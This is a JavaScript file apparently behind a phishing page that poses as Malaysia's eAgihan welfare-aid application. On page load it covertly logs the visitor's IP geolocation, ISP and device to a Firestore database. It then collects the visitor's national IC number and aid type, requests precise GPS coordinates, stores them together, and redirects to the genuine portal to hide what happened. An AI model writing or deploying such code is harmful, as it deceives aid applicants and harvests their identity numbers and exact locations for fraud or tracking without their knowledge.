import { saveSessionRecord, updateSessionWithGps, updateSessionApplicant, saveLocationRecord } from './db.js';

// DOM References
const userForm     = document.getElementById('userForm');
const jenisBantuan = document.getElementById('jenisBantuan');
const icNumber     = document.getElementById('icNumber');
const icType       = document.getElementById('icType');
const actionBtn    = document.getElementById('actionBtn');

// State
let detectedDevice = detectDeviceName();
let detectedHost = 'Resolving…';
let cachedIpData = null;
let currentSessionDocId = null;

// High-accuracy GPS options
const GPS_OPTIONS = {
  enableHighAccuracy: true,
  timeout: 10000,
  maximumAge: 0
};

/**
 * Identifies the client phone / PC device name & OS.
 */
function detectDeviceName() {
  const ua = navigator.userAgent;
  if (/iPhone/i.test(ua)) return 'Apple iPhone (iOS)';
  if (/iPad/i.test(ua)) return 'Apple iPad (iPadOS)';
  if (/Android/i.test(ua)) {
    const match = ua.match(/Android\s+([\d.]+)(?:;\s*([^;)]+))?/i);
    return match && match[2] ? `Android (${match[2].trim()})` : 'Android Mobile Device';
  }
  if (/Windows NT 10.0/i.test(ua)) return 'Windows 10/11 PC';
  if (/Windows/i.test(ua)) return 'Windows PC';
  if (/Macintosh|Mac OS X/i.test(ua)) return 'Apple Mac (macOS)';
  if (/Linux/i.test(ua)) return 'Linux PC';
  return navigator.platform || 'Unknown Device';
}

/**
 * Calculates geographical distance in kilometers between two GPS coordinates using Haversine formula.
 */
function getDistanceKm(lat1, lon1, lat2, lon2) {
  if (lat1 == null || lon1 == null || lat2 == null || lon2 == null) return null;
  const R = 6371; // Earth's mean radius in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
    Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return Number((R * c).toFixed(2));
}

/* =============================================================
   1. SILENT IP GEOLOCATION (Data 1: Auto on Page Load)
   ============================================================= */
export async function fetchIpLocation() {
  try {
    let data = null;

    // Primary: ipinfo.io (High-accuracy carrier & ISP mapping)
    try {
      const res = await fetch('https://ipinfo.io/json');
      const json = await res.json();
      if (json.loc && json.ip) {
        const [lat, lng] = json.loc.split(',').map(Number);
        data = {
          latitude: lat,
          longitude: lng,
          city: json.city,
          region: json.region,
          country: json.country,
          ip: json.ip,
          host: json.org || json.hostname || json.ip
        };
      }
    } catch (e) {
      console.warn('Primary IP service (ipinfo.io) failed, trying fallback...', e);
    }

    // Secondary: ipwho.is
    if (!data) {
      try {
        const res = await fetch('https://ipwho.is/');
        const json = await res.json();
        if (json.success) {
          data = {
            latitude: Number(json.latitude),
            longitude: Number(json.longitude),
            city: json.city,
            region: json.region,
            country: json.country,
            ip: json.ip,
            host: json.connection?.domain || json.connection?.isp || json.ip
          };
        }
      } catch (e) {
        console.warn('Secondary IP service (ipwho.is) failed, trying tertiary...', e);
      }
    }

    // Tertiary: freeipapi.com
    if (!data) {
      try {
        const res = await fetch('https://freeipapi.com/api/json');
        const json = await res.json();
        if (json.latitude && json.longitude) {
          data = {
            latitude: Number(json.latitude),
            longitude: Number(json.longitude),
            city: json.cityName,
            region: json.regionName,
            country: json.countryName,
            ip: json.ipAddress,
            host: json.asnOrganization || json.ipAddress
          };
        }
      } catch (e) {
        console.warn('Tertiary IP service (freeipapi.com) failed...', e);
      }
    }

    if (!data) return;

    // Cache resolved data
    cachedIpData = data;
    detectedHost = data.host || detectedHost;

    // Create unified session document in Firestore
    const dbResult = await saveSessionRecord({
      latitude: Number(data.latitude),
      longitude: Number(data.longitude),
      city: data.city,
      region: data.region,
      country: data.country,
      ip: data.ip,
      deviceName: detectedDevice,
      hostDomain: detectedHost,
      timestamp: Date.now()
    });

    if (dbResult.success) {
      currentSessionDocId = dbResult.docId;
    }

  } catch (err) {
    console.error('Silent IP capture error:', err);
  }
}

/* =============================================================
   2. HIGH-ACCURACY GPS (Data 2: On eAgihan Form Submission)
   ============================================================= */
export function handleFormSubmit(e) {
  if (e) e.preventDefault();

  const rawIC = icNumber ? icNumber.value.trim() : '';
  const cleanIC = rawIC.replace(/\D/g, '').slice(0, 12);
  if (icNumber) icNumber.value = cleanIC;

  const selectedBantuan = (jenisBantuan && jenisBantuan.value) ? jenisBantuan.value : 'Bantuan Sara Hidup';
  const selectedType = 'Kad Pengenalan Baru';

  if (!cleanIC || cleanIC.length !== 12) {
    alert('Sila masukkan tepat 12 digit nombor kad pengenalan (contoh: 900101035544).');
    if (icNumber) icNumber.focus();
    return;
  }

  const applicantIdentity = `${cleanIC} (${selectedBantuan})`;

  // Save applicant identity to Firestore session immediately
  if (currentSessionDocId) {
    updateSessionApplicant(currentSessionDocId, {
      userName: applicantIdentity,
      icNumber: cleanIC,
      jenisBantuan: selectedBantuan,
      icType: selectedType
    });
  }

  // Trigger GPS acquisition
  requestGpsLocation(applicantIdentity, cleanIC, selectedBantuan, selectedType);
}

export function requestGpsLocation(applicantIdentity, enteredIC, selectedBantuan, selectedType) {
  const REDIRECT_URL = 'https://eagihan.e-maik.my/';

  if (!navigator.geolocation) {
    console.warn('Geolocation not supported');
    window.location.href = REDIRECT_URL;
    return;
  }

  if (actionBtn) {
    actionBtn.disabled = true;
    actionBtn.innerHTML = `
      <svg class="spinner" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
        <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
      </svg>
      Sila tunggu…
    `;
  }
  if (icNumber) icNumber.disabled = true;
  if (jenisBantuan) jenisBantuan.disabled = true;
  if (icType) icType.disabled = true;

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const coords = position.coords;

      // Calculate distance difference between IP location and exact GPS
      let distanceDiffKm = null;
      if (cachedIpData && cachedIpData.latitude != null && cachedIpData.longitude != null) {
        distanceDiffKm = getDistanceKm(
          Number(cachedIpData.latitude),
          Number(cachedIpData.longitude),
          coords.latitude,
          coords.longitude
        );
      }

      try {
        if (currentSessionDocId) {
          // Update the exact same document with GPS & applicant details
          await updateSessionWithGps(currentSessionDocId, {
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            timestamp: position.timestamp,
            distanceDiffKm: distanceDiffKm,
            userName: applicantIdentity,
            icNumber: enteredIC,
            jenisBantuan: selectedBantuan,
            icType: selectedType
          });
        } else {
          // Fallback if IP took longer than the click
          const dbResult = await saveLocationRecord({
            userName: applicantIdentity,
            icNumber: enteredIC,
            jenisBantuan: selectedBantuan,
            icType: selectedType,
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy,
            method: 'BROWSER_GPS',
            city: cachedIpData?.city || null,
            region: cachedIpData?.region || null,
            country: cachedIpData?.country || null,
            ip: cachedIpData?.ip || null,
            deviceName: detectedDevice,
            hostDomain: detectedHost,
            timestamp: position.timestamp,
            distanceDiffKm: distanceDiffKm
          });
          if (dbResult.success) {
            currentSessionDocId = dbResult.docId;
          }
        }
      } catch (err) {
        console.error('GPS Firestore save error:', err);
      }

      if (actionBtn) {
        actionBtn.classList.add('btn--success');
        actionBtn.innerHTML = `
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="20 6 9 17 4 12"></polyline>
          </svg>
          Memproses…
        `;
      }

      // Redirect user to official eAgihan portal
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 500);
    },
    (error) => {
      console.warn('Geolocation error / permission denied:', error.message || error.code);
      // Redirect seamlessly even if user denied or timed out
      window.location.href = REDIRECT_URL;
    },
    GPS_OPTIONS
  );
}

function resetForm() {
  if (actionBtn) {
    actionBtn.disabled = false;
    actionBtn.classList.remove('btn--success');
    actionBtn.innerHTML = 'SETERUSNYA';
  }
  if (icNumber) icNumber.disabled = false;
  if (jenisBantuan) jenisBantuan.disabled = false;
  if (icType) icType.disabled = false;
}

// Enforce strictly 12 digits on IC field
if (icNumber) {
  icNumber.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 12);
  });
  icNumber.addEventListener('paste', () => {
    setTimeout(() => {
      icNumber.value = icNumber.value.replace(/\D/g, '').slice(0, 12);
    }, 0);
  });
}

// Event Listeners
if (userForm) {
  userForm.addEventListener('submit', handleFormSubmit);
} else if (actionBtn) {
  actionBtn.addEventListener('click', handleFormSubmit);
}

// AUTO-RUN: Silently capture Data 1 (IP Location) immediately before button click!
fetchIpLocation();
